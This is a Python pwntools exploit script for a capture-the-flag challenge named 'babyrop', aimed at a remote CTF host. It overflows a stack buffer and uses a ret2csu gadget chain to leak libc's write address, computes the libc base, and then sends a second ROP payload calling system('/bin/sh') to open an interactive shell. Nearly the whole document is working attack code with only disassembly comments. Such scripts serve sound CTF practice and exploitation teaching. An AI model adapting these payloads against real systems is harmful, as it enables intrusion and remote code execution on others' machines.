
from pwn import *

# r = process('./babyrop')
r = remote('dicec.tf', 31924)
elf = ELF('./babyrop', checksec=False)
libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so', checksec=False)

write_off = libc.sym['write']
write_got = elf.got['write']
main = 0x401136
pop_rdi = 0x4011d3 #: pop rdi; ret;

# .text:00000000004011C6                 add     rsp, 8
# .text:00000000004011CA                 pop     rbx
# .text:00000000004011CB                 pop     rbp
# .text:00000000004011CC                 pop     r12
# .text:00000000004011CE                 pop     r13
# .text:00000000004011D0                 pop     r14
# .text:00000000004011D2                 pop     r15
# .text:00000000004011D4                 retn

# .text:00000000004011B0                 mov     rdx, r14
# .text:00000000004011B3                 mov     rsi, r13
# .text:00000000004011B6                 mov     edi, r12d
# .text:00000000004011B9                 call    ds:(__frame_dummy_init_array_entry - 403E00h)[r15+rbx*8]
# .text:00000000004011BD                 add     rbx, 1
# .text:00000000004011C1                 cmp     rbp, rbx
# .text:00000000004011C4                 jnz     short loc_4011B0

p = b'A' * 72
p += p64(0x4011C6)
p += p64(0)
p += p64(0)
p += p64(1)
p += p64(1)
p += p64(write_got)
p += p64(64)
p += p64(write_got)
p += p64(0x4011B0)
p += b'A' * 56
p += p64(main)

r.recvuntil('name: ')
r.sendline(p)

leak =  int.from_bytes(r.recvuntil('name: ')[:8], byteorder='little')

LIBC_BASE = leak - write_off
ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

p = b'A' * 72
p += p64(pop_rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.sendline(p)

r.interactive()

